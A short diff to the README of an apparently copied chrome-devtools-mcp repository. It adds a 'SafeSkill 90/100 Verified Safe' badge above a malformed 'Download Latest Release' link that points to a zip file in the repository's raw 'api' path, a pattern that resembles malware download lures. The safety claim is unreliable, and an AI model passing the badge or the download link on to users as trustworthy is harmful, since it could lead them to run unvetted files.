@@ -1,5 +1,7 @@
 # 🚀 chrome-devtools-mcp - Simplify Your Chrome Debugging Process
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/bklamheem-chrome-devtools-mcp)
+
 [![Download Latest Release](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip%20Latest%https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)
 
 ## 📦 Overview
